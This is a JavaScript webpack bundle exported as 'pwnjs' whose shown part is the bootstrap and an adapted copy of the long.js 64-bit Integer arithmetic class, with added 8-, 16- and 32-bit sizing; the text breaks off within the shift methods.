var pwnjs =
/******/ (function(modules) { // webpackBootstrap
/******/ 	// The module cache
/******/ 	var installedModules = {};
/******/
/******/ 	// The require function
/******/ 	function __webpack_require__(moduleId) {
/******/
/******/ 		// Check if module is in cache
/******/ 		if(installedModules[moduleId]) {
/******/ 			return installedModules[moduleId].exports;
/******/ 		}
/******/ 		// Create a new module (and put it into the cache)
/******/ 		var module = installedModules[moduleId] = {
/******/ 			i: moduleId,
/******/ 			l: false,
/******/ 			exports: {}
/******/ 		};
/******/
/******/ 		// Execute the module function
/******/ 		modules[moduleId].call(module.exports, module, module.exports, __webpack_require__);
/******/
/******/ 		// Flag the module as loaded
/******/ 		module.l = true;
/******/
/******/ 		// Return the exports of the module
/******/ 		return module.exports;
/******/ 	}
/******/
/******/
/******/ 	// expose the modules object (__webpack_modules__)
/******/ 	__webpack_require__.m = modules;
/******/
/******/ 	// expose the module cache
/******/ 	__webpack_require__.c = installedModules;
/******/
/******/ 	// define getter function for harmony exports
/******/ 	__webpack_require__.d = function(exports, name, getter) {
/******/ 		if(!__webpack_require__.o(exports, name)) {
/******/ 			Object.defineProperty(exports, name, {
/******/ 				configurable: false,
/******/ 				enumerable: true,
/******/ 				get: getter
/******/ 			});
/******/ 		}
/******/ 	};
/******/
/******/ 	// getDefaultExport function for compatibility with non-harmony modules
/******/ 	__webpack_require__.n = function(module) {
/******/ 		var getter = module && module.__esModule ?
/******/ 			function getDefault() { return module['default']; } :
/******/ 			function getModuleExports() { return module; };
/******/ 		__webpack_require__.d(getter, 'a', getter);
/******/ 		return getter;
/******/ 	};
/******/
/******/ 	// Object.prototype.hasOwnProperty.call
/******/ 	__webpack_require__.o = function(object, property) { return Object.prototype.hasOwnProperty.call(object, property); };
/******/
/******/ 	// __webpack_public_path__
/******/ 	__webpack_require__.p = "";
/******/
/******/ 	// Load entry module and return exports
/******/ 	return __webpack_require__(__webpack_require__.s = 3);
/******/ })
/************************************************************************/
/******/ ([
/* 0 */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
/**
 * @license long.js (c) 2013 Daniel Wirtz <dcode@dcode.io>
 * Released under the Apache License, Version 2.0
 * see: https://github.com/dcodeIO/long.js for details
 */
var Integer = (function() {
    /**
     * Constructs a 64 bit two's-complement integer, given its low and high 32 bit values as *signed* integers.
     *  See the from* functions below for more convenient ways of constructing Integers.
     * @exports Integer
     * @class A Integer class for representing a 64 bit two's-complement integer value.
     * @param {number} low The low (signed) 32 bits of the long
     * @param {number} high The high (signed) 32 bits of the long
     * @param {boolean=} unsigned Whether unsigned or not, defaults to `false` for signed
     * @constructor
     */
    function Integer(low, high, unsigned, size) {

        this.size = size || 64;

        if (size == 8) {
            low &= 0xff;
            if (unsigned || low < 0x80) {
                high = 0;
            } else {
                low |= 0xffffff00;
                high = 0xffffffff;
            }
        } else if (size == 16) {
            low &= 0xffff;
            if (unsigned || low < 0x8000) {
                high = 0;
            } else {
                low |= 0xffff0000;
                high = 0xffffffff;
            }
        } else if (size == 32) {
            if (unsigned || (low|0) >= 0) {
                high = 0;
            } else {
                high = 0xffffffff;
            }
        }

        /**
         * The low 32 bits as a signed value.
         * @type {number}
         */
        this.low = low | 0;

        /**
         * The high 32 bits as a signed value.
         * @type {number}
         */
        this.high = high | 0;

        /**
         * Whether unsigned or not.
         * @type {boolean}
         */
        this.unsigned = !!unsigned;
    }

    // The internal representation of a long is the two given signed, 32-bit values.
    // We use 32-bit pieces because these are the size of integers on which
    // Javascript performs bit-operations.  For operations like addition and
    // multiplication, we split each number into 16 bit pieces, which can easily be
    // multiplied within Javascript's floating-point representation without overflow
    // or change in sign.
    //
    // In the algorithms below, we frequently reduce the negative case to the
    // positive case by negating the input(s) and then post-processing the result.
    // Note that we must ALWAYS check specially whether those values are MIN_VALUE
    // (-2^63) because -MIN_VALUE == MIN_VALUE (since 2^63 cannot be represented as
    // a positive number, it overflows back into a negative).  Not handling this
    // case would often result in infinite recursion.
    //
    // Common constant values ZERO, ONE, NEG_ONE, etc. are defined below the from*
    // methods on which they depend.

    /**
     * An indicator used to reliably determine if an object is a Integer or not.
     * @type {boolean}
     * @const
     * @private
     */
    Integer.prototype.__isInteger__;

    Object.defineProperty(Integer.prototype, "__isInteger__", {
        value: true,
        enumerable: false,
        configurable: false
    });

    /**
     * @function
     * @param {*} obj Object
     * @returns {boolean}
     * @inner
     */
    function isInteger(obj) {
        return (obj && obj["__isInteger__"]) === true;
    }

    /**
     * Tests if the specified object is a Integer.
     * @function
     * @param {*} obj Object
     * @returns {boolean}
     */
    Integer.isInteger = isInteger;

    /**
     * A cache of the Integer representations of small integer values.
     * @type {!Object}
     * @inner
     */
    var INT_CACHE = {};

    /**
     * A cache of the Integer representations of small unsigned integer values.
     * @type {!Object}
     * @inner
     */
    var UINT_CACHE = {};

    /**
     * @param {number} value
     * @param {boolean=} unsigned
     * @returns {!Integer}
     * @inner
     */
    function fromInt(value, unsigned) {
        var obj, cachedObj, cache;
        if (unsigned) {
            value >>>= 0;
            if (cache = (0 <= value && value < 256)) {
                cachedObj = UINT_CACHE[value];
                if (cachedObj)
                    return cachedObj;
            }
            obj = fromBits(value, (value | 0) < 0 ? -1 : 0, true);
            if (cache)
                UINT_CACHE[value] = obj;
            return obj;
        } else {
            value |= 0;
            if (cache = (-128 <= value && value < 128)) {
                cachedObj = INT_CACHE[value];
                if (cachedObj)
                    return cachedObj;
            }
            obj = fromBits(value, value < 0 ? -1 : 0, false);
            if (cache)
                INT_CACHE[value] = obj;
            return obj;
        }
    }

    /**
     * Returns a Integer representing the given 32 bit integer value.
     * @function
     * @param {number} value The 32 bit integer in question
     * @param {boolean=} unsigned Whether unsigned or not, defaults to `false` for signed
     * @returns {!Integer} The corresponding Integer value
     */
    Integer.fromInt = fromInt;

    /**
     * @param {number} value
     * @param {boolean=} unsigned
     * @returns {!Integer}
     * @inner
     */
    function fromNumber(value, unsigned) {
        if (isNaN(value) || !isFinite(value))
            return unsigned ? UZERO : ZERO;
        if (unsigned) {
            if (value < 0)
                return UZERO;
            if (value >= TWO_PWR_64_DBL)
                return MAX_UNSIGNED_VALUE;
        } else {
            if (value <= -TWO_PWR_63_DBL)
                return MIN_VALUE;
            if (value + 1 >= TWO_PWR_63_DBL)
                return MAX_VALUE;
        }
        if (value < 0)
            return fromNumber(-value, unsigned).neg();
        return fromBits((value % TWO_PWR_32_DBL) | 0, (value / TWO_PWR_32_DBL) | 0, unsigned);
    }

    /**
     * Returns a Integer representing the given value, provided that it is a finite number. Otherwise, zero is returned.
     * @function
     * @param {number} value The number in question
     * @param {boolean=} unsigned Whether unsigned or not, defaults to `false` for signed
     * @returns {!Integer} The corresponding Integer value
     */
    Integer.fromNumber = fromNumber;

    /**
     * @param {number} lowBits
     * @param {number} highBits
     * @param {boolean=} unsigned
     * @returns {!Integer}
     * @inner
     */
    function fromBits(lowBits, highBits, unsigned) {
        return new Integer(lowBits, highBits, unsigned);
    }

    /**
     * Returns a Integer representing the 64 bit integer that comes by concatenating the given low and high bits. Each is
     *  assumed to use 32 bits.
     * @function
     * @param {number} lowBits The low 32 bits
     * @param {number} highBits The high 32 bits
     * @param {boolean=} unsigned Whether unsigned or not, defaults to `false` for signed
     * @returns {!Integer} The corresponding Integer value
     */
    Integer.fromBits = fromBits;

    /**
     * @function
     * @param {number} base
     * @param {number} exponent
     * @returns {number}
     * @inner
     */
    var pow_dbl = Math.pow; // Used 4 times (4*8 to 15+4)

    /**
     * @param {string} str
     * @param {(boolean|number)=} unsigned
     * @param {number=} radix
     * @returns {!Integer}
     * @inner
     */
    function fromString(str, unsigned, radix) {
        if (str.length === 0)
            throw Error('empty string');
        if (str === "NaN" || str === "Infinity" || str === "+Infinity" || str === "-Infinity")
            return ZERO;
        if (typeof unsigned === 'number') { 
            // For goog.math.long compatibility
            radix = unsigned,
            unsigned = false;
        } else {
            unsigned = !! unsigned;
        }
        radix = radix || 10;
        if (radix < 2 || 36 < radix)
            throw RangeError('radix');

        var p;
        if ((p = str.indexOf('-')) > 0)
            throw Error('interior hyphen');
        else if (p === 0) {
            return fromString(str.substring(1), unsigned, radix).neg();
        }

        // Do several (8) digits each time through the loop, so as to
        // minimize the calls to the very expensive emulated div.
        var radixToPower = fromNumber(pow_dbl(radix, 8));

        var result = ZERO;
        for (var i = 0; i < str.length; i += 8) {
            var size = Math.min(8, str.length - i),
                value = parseInt(str.substring(i, i + size), radix);
            if (size < 8) {
                var power = fromNumber(pow_dbl(radix, size));
                result = result.mul(power).add(fromNumber(value));
            } else {
                result = result.mul(radixToPower);
                result = result.add(fromNumber(value));
            }
        }
        result.unsigned = unsigned;
        return result;
    }

    /**
     * Returns a Integer representation of the given string, written using the specified radix.
     * @function
     * @param {string} str The textual representation of the Integer
     * @param {(boolean|number)=} unsigned Whether unsigned or not, defaults to `false` for signed
     * @param {number=} radix The radix in which the text is written (2-36), defaults to 10
     * @returns {!Integer} The corresponding Integer value
     */
    Integer.fromString = fromString;

    /**
     * @function
     * @param {!Integer|number|string|!{low: number, high: number, unsigned: boolean}} val
     * @returns {!Integer}
     * @inner
     */
    function fromValue(val) {
        if (val /* is compatible */ instanceof Integer)
            return val;
        if (typeof val === 'number')
            return fromNumber(val);
        if (typeof val === 'string')
            return fromString(val);
        // Throws for non-objects, converts non-instanceof Integer:
        return fromBits(val.low, val.high, val.unsigned);
    }

    /**
     * Converts the specified value to a Integer.
     * @function
     * @param {!Integer|number|string|!{low: number, high: number, unsigned: boolean}} val Value
     * @returns {!Integer}
     */
    Integer.fromValue = fromValue;

    // NOTE: the compiler should inline these constant values below and then remove these variables, so there should be
    // no runtime penalty for these.

    /**
     * @type {number}
     * @const
     * @inner
     */
    var TWO_PWR_16_DBL = 1 << 16;

    /**
     * @type {number}
     * @const
     * @inner
     */
    var TWO_PWR_24_DBL = 1 << 24;

    /**
     * @type {number}
     * @const
     * @inner
     */
    var TWO_PWR_32_DBL = TWO_PWR_16_DBL * TWO_PWR_16_DBL;

    /**
     * @type {number}
     * @const
     * @inner
     */
    var TWO_PWR_64_DBL = TWO_PWR_32_DBL * TWO_PWR_32_DBL;

    /**
     * @type {number}
     * @const
     * @inner
     */
    var TWO_PWR_63_DBL = TWO_PWR_64_DBL / 2;

    /**
     * @type {!Integer}
     * @const
     * @inner
     */
    var TWO_PWR_24 = fromInt(TWO_PWR_24_DBL);

    /**
     * @type {!Integer}
     * @inner
     */
    var ZERO = fromInt(0);

    /**
     * Signed zero.
     * @type {!Integer}
     */
    Integer.ZERO = ZERO;

    /**
     * @type {!Integer}
     * @inner
     */
    var UZERO = fromInt(0, true);

    /**
     * Unsigned zero.
     * @type {!Integer}
     */
    Integer.UZERO = UZERO;

    /**
     * @type {!Integer}
     * @inner
     */
    var ONE = fromInt(1);

    /**
     * Signed one.
     * @type {!Integer}
     */
    Integer.ONE = ONE;

    /**
     * @type {!Integer}
     * @inner
     */
    var UONE = fromInt(1, true);

    /**
     * Unsigned one.
     * @type {!Integer}
     */
    Integer.UONE = UONE;

    /**
     * @type {!Integer}
     * @inner
     */
    var NEG_ONE = fromInt(-1);

    /**
     * Signed negative one.
     * @type {!Integer}
     */
    Integer.NEG_ONE = NEG_ONE;

    /**
     * @type {!Integer}
     * @inner
     */
    var MAX_VALUE = fromBits(0xFFFFFFFF|0, 0x7FFFFFFF|0, false);

    /**
     * Maximum signed value.
     * @type {!Integer}
     */
    Integer.MAX_VALUE = MAX_VALUE;

    /**
     * @type {!Integer}
     * @inner
     */
    var MAX_UNSIGNED_VALUE = fromBits(0xFFFFFFFF|0, 0xFFFFFFFF|0, true);

    /**
     * Maximum unsigned value.
     * @type {!Integer}
     */
    Integer.MAX_UNSIGNED_VALUE = MAX_UNSIGNED_VALUE;

    /**
     * @type {!Integer}
     * @inner
     */
    var MIN_VALUE = fromBits(0, 0x80000000|0, false);

    /**
     * Minimum signed value.
     * @type {!Integer}
     */
    Integer.MIN_VALUE = MIN_VALUE;

    /**
     * @alias Integer.prototype
     * @inner
     */
    var IntegerPrototype = Integer.prototype;

    /**
     * Converts the Integer to a 32 bit integer, assuming it is a 32 bit integer.
     * @returns {number}
     */
    IntegerPrototype.toInt = function toInt() {
        return this.unsigned ? this.low >>> 0 : this.low;
    };

    /**
     * Converts the Integer to a the nearest floating-point representation of this value (double, 53 bit mantissa).
     * @returns {number}
     */
    IntegerPrototype.toNumber = function toNumber() {
        if (this.unsigned)
            return ((this.high >>> 0) * TWO_PWR_32_DBL) + (this.low >>> 0);
        return this.high * TWO_PWR_32_DBL + (this.low >>> 0);
    };

    /**
     * Converts the Integer to a string written in the specified radix.
     * @param {number=} radix Radix (2-36), defaults to 10
     * @returns {string}
     * @override
     * @throws {RangeError} If `radix` is out of range
     */
    IntegerPrototype.toString = function toString(radix) {
        radix = radix || 10;
        if (radix < 2 || 36 < radix)
            throw RangeError('radix');
        if (this.isZero())
            return '0';
        if (this.isNegative()) { // Unsigned Integers are never negative
            if (this.eq(MIN_VALUE)) {
                // We need to change the Integer value before it can be negated, so we remove
                // the bottom-most digit in this base and then recurse to do the rest.
                var radixInteger = fromNumber(radix),
                    div = this.div(radixInteger),
                    rem1 = div.mul(radixInteger).sub(this);
                return div.toString(radix) + rem1.toInt().toString(radix);
            } else
                return '-' + this.neg().toString(radix);
        }

        // Do several (6) digits each time through the loop, so as to
        // minimize the calls to the very expensive emulated div.
        var radixToPower = fromNumber(pow_dbl(radix, 6), this.unsigned),
            rem = this;
        var result = '';
        while (true) {
            var remDiv = rem.div(radixToPower),
                intval = rem.sub(remDiv.mul(radixToPower)).toInt() >>> 0,
                digits = intval.toString(radix);
            rem = remDiv;
            if (rem.isZero())
                return digits + result;
            else {
                while (digits.length < 6)
                    digits = '0' + digits;
                result = '' + digits + result;
            }
        }
    };

    /**
     * Gets the high 32 bits as a signed integer.
     * @returns {number} Signed high bits
     */
    IntegerPrototype.getHighBits = function getHighBits() {
        return this.high;
    };

    /**
     * Gets the high 32 bits as an unsigned integer.
     * @returns {number} Unsigned high bits
     */
    IntegerPrototype.getHighBitsUnsigned = function getHighBitsUnsigned() {
        return this.high >>> 0;
    };

    /**
     * Gets the low 32 bits as a signed integer.
     * @returns {number} Signed low bits
     */
    IntegerPrototype.getLowBits = function getLowBits() {
        return this.low;
    };

    /**
     * Gets the low 32 bits as an unsigned integer.
     * @returns {number} Unsigned low bits
     */
    IntegerPrototype.getLowBitsUnsigned = function getLowBitsUnsigned() {
        return this.low >>> 0;
    };

    /**
     * Gets the number of bits needed to represent the absolute value of this Integer.
     * @returns {number}
     */
    IntegerPrototype.getNumBitsAbs = function getNumBitsAbs() {
        if (this.isNegative()) // Unsigned Integers are never negative
            return this.eq(MIN_VALUE) ? 64 : this.neg().getNumBitsAbs();
        var val = this.high != 0 ? this.high : this.low;
        for (var bit = 31; bit > 0; bit--)
            if ((val & (1 << bit)) != 0)
                break;
        return this.high != 0 ? bit + 33 : bit + 1;
    };

    /**
     * Tests if this Integer's value equals zero.
     * @returns {boolean}
     */
    IntegerPrototype.isZero = function isZero() {
        return this.high === 0 && this.low === 0;
    };

    /**
     * Tests if this Integer's value is negative.
     * @returns {boolean}
     */
    IntegerPrototype.isNegative = function isNegative() {
        return !this.unsigned && this.high < 0;
    };

    /**
     * Tests if this Integer's value is positive.
     * @returns {boolean}
     */
    IntegerPrototype.isPositive = function isPositive() {
        return this.unsigned || this.high >= 0;
    };

    /**
     * Tests if this Integer's value is odd.
     * @returns {boolean}
     */
    IntegerPrototype.isOdd = function isOdd() {
        return (this.low & 1) === 1;
    };

    /**
     * Tests if this Integer's value is even.
     * @returns {boolean}
     */
    IntegerPrototype.isEven = function isEven() {
        return (this.low & 1) === 0;
    };

    /**
     * Tests if this Integer's value equals the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.equals = function equals(other) {
        if (!isInteger(other))
            other = fromValue(other);
        if (this.unsigned !== other.unsigned && (this.high >>> 31) === 1 && (other.high >>> 31) === 1)
            return false;
        return this.high === other.high && this.low === other.low;
    };

    /**
     * Tests if this Integer's value equals the specified's. This is an alias of {@link Integer#equals}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.eq = IntegerPrototype.equals;

    /**
     * Tests if this Integer's value differs from the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.notEquals = function notEquals(other) {
        return !this.eq(/* validates */ other);
    };

    /**
     * Tests if this Integer's value differs from the specified's. This is an alias of {@link Integer#notEquals}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.neq = IntegerPrototype.notEquals;

    /**
     * Tests if this Integer's value is less than the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.lessThan = function lessThan(other) {
        return this.comp(/* validates */ other) < 0;
    };

    /**
     * Tests if this Integer's value is less than the specified's. This is an alias of {@link Integer#lessThan}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.lt = IntegerPrototype.lessThan;

    /**
     * Tests if this Integer's value is less than or equal the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.lessThanOrEqual = function lessThanOrEqual(other) {
        return this.comp(/* validates */ other) <= 0;
    };

    /**
     * Tests if this Integer's value is less than or equal the specified's. This is an alias of {@link Integer#lessThanOrEqual}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.lte = IntegerPrototype.lessThanOrEqual;

    /**
     * Tests if this Integer's value is greater than the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.greaterThan = function greaterThan(other) {
        return this.comp(/* validates */ other) > 0;
    };

    /**
     * Tests if this Integer's value is greater than the specified's. This is an alias of {@link Integer#greaterThan}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.gt = IntegerPrototype.greaterThan;

    /**
     * Tests if this Integer's value is greater than or equal the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.greaterThanOrEqual = function greaterThanOrEqual(other) {
        return this.comp(/* validates */ other) >= 0;
    };

    /**
     * Tests if this Integer's value is greater than or equal the specified's. This is an alias of {@link Integer#greaterThanOrEqual}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {boolean}
     */
    IntegerPrototype.gte = IntegerPrototype.greaterThanOrEqual;

    /**
     * Compares this Integer's value with the specified's.
     * @param {!Integer|number|string} other Other value
     * @returns {number} 0 if they are the same, 1 if the this is greater and -1
     *  if the given one is greater
     */
    IntegerPrototype.compare = function compare(other) {
        if (!isInteger(other))
            other = fromValue(other);
        if (this.eq(other))
            return 0;
        var thisNeg = this.isNegative(),
            otherNeg = other.isNegative();
        if (thisNeg && !otherNeg)
            return -1;
        if (!thisNeg && otherNeg)
            return 1;
        // At this point the sign bits are the same
        if (!this.unsigned)
            return this.sub(other).isNegative() ? -1 : 1;
        // Both are positive if at least one is unsigned
        return (other.high >>> 0) > (this.high >>> 0) || (other.high === this.high && (other.low >>> 0) > (this.low >>> 0)) ? -1 : 1;
    };

    /**
     * Compares this Integer's value with the specified's. This is an alias of {@link Integer#compare}.
     * @function
     * @param {!Integer|number|string} other Other value
     * @returns {number} 0 if they are the same, 1 if the this is greater and -1
     *  if the given one is greater
     */
    IntegerPrototype.comp = IntegerPrototype.compare;

    /**
     * Negates this Integer's value.
     * @returns {!Integer} Negated Integer
     */
    IntegerPrototype.negate = function negate() {
        if (!this.unsigned && this.eq(MIN_VALUE))
            return MIN_VALUE;
        return this.not().add(ONE);
    };

    /**
     * Negates this Integer's value. This is an alias of {@link Integer#negate}.
     * @function
     * @returns {!Integer} Negated Integer
     */
    IntegerPrototype.neg = IntegerPrototype.negate;

    /**
     * Returns the sum of this and the specified Integer.
     * @param {!Integer|number|string} addend Addend
     * @returns {!Integer} Sum
     */
    IntegerPrototype.add = function add(addend) {
        if (!isInteger(addend))
            addend = fromValue(addend);

        // Divide each number into 4 chunks of 16 bits, and then sum the chunks.

        var a48 = this.high >>> 16;
        var a32 = this.high & 0xFFFF;
        var a16 = this.low >>> 16;
        var a00 = this.low & 0xFFFF;

        var b48 = addend.high >>> 16;
        var b32 = addend.high & 0xFFFF;
        var b16 = addend.low >>> 16;
        var b00 = addend.low & 0xFFFF;

        var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
        c00 += a00 + b00;
        c16 += c00 >>> 16;
        c00 &= 0xFFFF;
        c16 += a16 + b16;
        c32 += c16 >>> 16;
        c16 &= 0xFFFF;
        c32 += a32 + b32;
        c48 += c32 >>> 16;
        c32 &= 0xFFFF;
        c48 += a48 + b48;
        c48 &= 0xFFFF;
        return fromBits((c16 << 16) | c00, (c48 << 16) | c32, this.unsigned, this.size);
    };

    /**
     * Returns the difference of this and the specified Integer.
     * @param {!Integer|number|string} subtrahend Subtrahend
     * @returns {!Integer} Difference
     */
    IntegerPrototype.subtract = function subtract(subtrahend) {
        if (!isInteger(subtrahend))
            subtrahend = fromValue(subtrahend);
        return this.add(subtrahend.neg());
    };

    /**
     * Returns the difference of this and the specified Integer. This is an alias of {@link Integer#subtract}.
     * @function
     * @param {!Integer|number|string} subtrahend Subtrahend
     * @returns {!Integer} Difference
     */
    IntegerPrototype.sub = IntegerPrototype.subtract;

    /**
     * Returns the product of this and the specified Integer.
     * @param {!Integer|number|string} multiplier Multiplier
     * @returns {!Integer} Product
     */
    IntegerPrototype.multiply = function multiply(multiplier) {
        if (this.isZero())
            return ZERO;
        if (!isInteger(multiplier))
            multiplier = fromValue(multiplier);
        if (multiplier.isZero())
            return ZERO;
        if (this.eq(MIN_VALUE))
            return multiplier.isOdd() ? MIN_VALUE : ZERO;
        if (multiplier.eq(MIN_VALUE))
            return this.isOdd() ? MIN_VALUE : ZERO;

        if (this.isNegative()) {
            if (multiplier.isNegative())
                return this.neg().mul(multiplier.neg());
            else
                return this.neg().mul(multiplier).neg();
        } else if (multiplier.isNegative())
            return this.mul(multiplier.neg()).neg();

        // If both longs are small, use float multiplication
        if (this.lt(TWO_PWR_24) && multiplier.lt(TWO_PWR_24))
            return fromNumber(this.toNumber() * multiplier.toNumber(), this.unsigned);

        // Divide each long into 4 chunks of 16 bits, and then add up 4x4 products.
        // We can skip products that would overflow.

        var a48 = this.high >>> 16;
        var a32 = this.high & 0xFFFF;
        var a16 = this.low >>> 16;
        var a00 = this.low & 0xFFFF;

        var b48 = multiplier.high >>> 16;
        var b32 = multiplier.high & 0xFFFF;
        var b16 = multiplier.low >>> 16;
        var b00 = multiplier.low & 0xFFFF;

        var c48 = 0, c32 = 0, c16 = 0, c00 = 0;
        c00 += a00 * b00;
        c16 += c00 >>> 16;
        c00 &= 0xFFFF;
        c16 += a16 * b00;
        c32 += c16 >>> 16;
        c16 &= 0xFFFF;
        c16 += a00 * b16;
        c32 += c16 >>> 16;
        c16 &= 0xFFFF;
        c32 += a32 * b00;
        c48 += c32 >>> 16;
        c32 &= 0xFFFF;
        c32 += a16 * b16;
        c48 += c32 >>> 16;
        c32 &= 0xFFFF;
        c32 += a00 * b32;
        c48 += c32 >>> 16;
        c32 &= 0xFFFF;
        c48 += a48 * b00 + a32 * b16 + a16 * b32 + a00 * b48;
        c48 &= 0xFFFF;
        return fromBits((c16 << 16) | c00, (c48 << 16) | c32, this.unsigned, this.size);
    };

    /**
     * Returns the product of this and the specified Integer. This is an alias of {@link Integer#multiply}.
     * @function
     * @param {!Integer|number|string} multiplier Multiplier
     * @returns {!Integer} Product
     */
    IntegerPrototype.mul = IntegerPrototype.multiply;

    /**
     * Returns this Integer divided by the specified. The result is signed if this Integer is signed or
     *  unsigned if this Integer is unsigned.
     * @param {!Integer|number|string} divisor Divisor
     * @returns {!Integer} Quotient
     */
    IntegerPrototype.divide = function divide(divisor) {
        if (!isInteger(divisor))
            divisor = fromValue(divisor);
        if (divisor.isZero())
            throw Error('division by zero');
        if (this.isZero())
            return this.unsigned ? UZERO : ZERO;
        var approx, rem, res;
        if (!this.unsigned) {
            // This section is only relevant for signed longs and is derived from the
            // closure library as a whole.
            if (this.eq(MIN_VALUE)) {
                if (divisor.eq(ONE) || divisor.eq(NEG_ONE))
                    return MIN_VALUE;  // recall that -MIN_VALUE == MIN_VALUE
                else if (divisor.eq(MIN_VALUE))
                    return ONE;
                else {
                    // At this point, we have |other| >= 2, so |this/other| < |MIN_VALUE|.
                    var halfThis = this.shr(1);
                    approx = halfThis.div(divisor).shl(1);
                    if (approx.eq(ZERO)) {
                        return divisor.isNegative() ? ONE : NEG_ONE;
                    } else {
                        rem = this.sub(divisor.mul(approx));
                        res = approx.add(rem.div(divisor));
                        return res;
                    }
                }
            } else if (divisor.eq(MIN_VALUE))
                return this.unsigned ? UZERO : ZERO;
            if (this.isNegative()) {
                if (divisor.isNegative())
                    return this.neg().div(divisor.neg());
                return this.neg().div(divisor).neg();
            } else if (divisor.isNegative())
                return this.div(divisor.neg()).neg();
            res = ZERO;
        } else {
            // The algorithm below has not been made for unsigned longs. It's therefore
            // required to take special care of the MSB prior to running it.
            if (!divisor.unsigned)
                divisor = divisor.toUnsigned();
            if (divisor.gt(this))
                return UZERO;
            if (divisor.gt(this.shru(1))) // 15 >>> 1 = 7 ; with divisor = 8 ; true
                return UONE;
            res = UZERO;
        }

        // Repeat the following until the remainder is less than other:  find a
        // floating-point that approximates remainder / other *from below*, add this
        // into the result, and subtract it from the remainder.  It is critical that
        // the approximate value is less than or equal to the real value so that the
        // remainder never becomes negative.
        rem = this;
        while (rem.gte(divisor)) {
            // Approximate the result of division. This may be a little greater or
            // smaller than the actual value.
            approx = Math.max(1, Math.floor(rem.toNumber() / divisor.toNumber()));

            // We will tweak the approximate result by changing it in the 48-th digit or
            // the smallest non-fractional digit, whichever is larger.
            var log2 = Math.ceil(Math.log(approx) / Math.LN2),
                delta = (log2 <= 48) ? 1 : pow_dbl(2, log2 - 48),

            // Decrease the approximation until it is smaller than the remainder.  Note
            // that if it is too large, the product overflows and is negative.
                approxRes = fromNumber(approx),
                approxRem = approxRes.mul(divisor);
            while (approxRem.isNegative() || approxRem.gt(rem)) {
                approx -= delta;
                approxRes = fromNumber(approx, this.unsigned);
                approxRem = approxRes.mul(divisor);
            }

            // We know the answer can't be zero... and actually, zero would cause
            // infinite recursion since we would make no progress.
            if (approxRes.isZero())
                approxRes = ONE;

            res = res.add(approxRes);
            rem = rem.sub(approxRem);
        }
        return res;
    };

    /**
     * Returns this Integer divided by the specified. This is an alias of {@link Integer#divide}.
     * @function
     * @param {!Integer|number|string} divisor Divisor
     * @returns {!Integer} Quotient
     */
    IntegerPrototype.div = IntegerPrototype.divide;

    /**
     * Returns this Integer modulo the specified.
     * @param {!Integer|number|string} divisor Divisor
     * @returns {!Integer} Remainder
     */
    IntegerPrototype.modulo = function modulo(divisor) {
        if (!isInteger(divisor))
            divisor = fromValue(divisor);
        return this.sub(this.div(divisor).mul(divisor));
    };

    /**
     * Returns this Integer modulo the specified. This is an alias of {@link Integer#modulo}.
     * @function
     * @param {!Integer|number|string} divisor Divisor
     * @returns {!Integer} Remainder
     */
    IntegerPrototype.mod = IntegerPrototype.modulo;

    /**
     * Returns the bitwise NOT of this Integer.
     * @returns {!Integer}
     */
    IntegerPrototype.not = function not() {
        return fromBits(~this.low, ~this.high, this.unsigned, this.size);
    };

    /**
     * Returns the bitwise AND of this Integer and the specified.
     * @param {!Integer|number|string} other Other Integer
     * @returns {!Integer}
     */
    IntegerPrototype.and = function and(other) {
        if (!isInteger(other))
            other = fromValue(other);
        return fromBits(this.low & other.low, this.high & other.high, this.unsigned, this.size);
    };

    /**
     * Returns the bitwise OR of this Integer and the specified.
     * @param {!Integer|number|string} other Other Integer
     * @returns {!Integer}
     */
    IntegerPrototype.or = function or(other) {
        if (!isInteger(other))
            other = fromValue(other);
        return fromBits(this.low | other.low, this.high | other.high, this.unsigned, this.size);
    };

    /**
     * Returns the bitwise XOR of this Integer and the given one.
     * @param {!Integer|number|string} other Other Integer
     * @returns {!Integer}
     */
    IntegerPrototype.xor = function xor(other) {
        if (!isInteger(other))
            other = fromValue(other);
        return fromBits(this.low ^ other.low, this.high ^ other.high, this.unsigned, this.size);
    };

    /**
     * Returns this Integer with bits shifted to the left by the given amount.
     * @param {number|!Integer} numBits Number of bits
     * @returns {!Integer} Shifted Integer
     */
    IntegerPrototype.shiftLeft = function shiftLeft(numBits) {
        if (isInteger(numBits))
            numBits = numBits.toInt();
        if ((numBits &= 63) === 0)
            return this;
        else if (numBits < 32)
            return fromBits(this.low << numBits, (this.high << numBits) | (this.low >>> (32 - numBits)), this.unsigned, this.size);
        else
            return fromBits(0, this.low << (numBits - 32), this.unsigned, this.size);
    };

    /**
     * Returns this Integer with bits shifted to the left by the given amount. This is an alias of {@link Integer#shiftLeft}.
     * @function
     * @param {number|!Integer} numBits Number of bits
     * @returns {!Integer} Shifted Integer
     */
    IntegerPrototype.shl = IntegerPrototype.shiftLeft;

    /**
     * Returns this Integer with bits arithmetically shifted to the right by the given amount.
     * @param {number|!Integer} numBits Number of bits
     * @returns {!Integer} Shifted Integer
     */
    IntegerPrototype.shiftRight = function shiftRight(numBits) {
        if (isInteger(numBits))
            numBits = numBits.toInt();
        if ((numBits &= 63) === 0)
            return this;
        else if (numBits < 32)
            return fromBits((this.low >>> numBits) | (this.high << (32 - numBits)), this.high >> numBits, this.unsigned, this.size);
        else
            return fromBits(this.high >> (numBits - 32), this.high >= 0 ? 0 : -1, this.unsigned, this.size);
    };

    /**
     * Returns this Integer with bits arithmetically shifted to the right by the given amount. This is an alias of {@link Integer#shiftRight}.
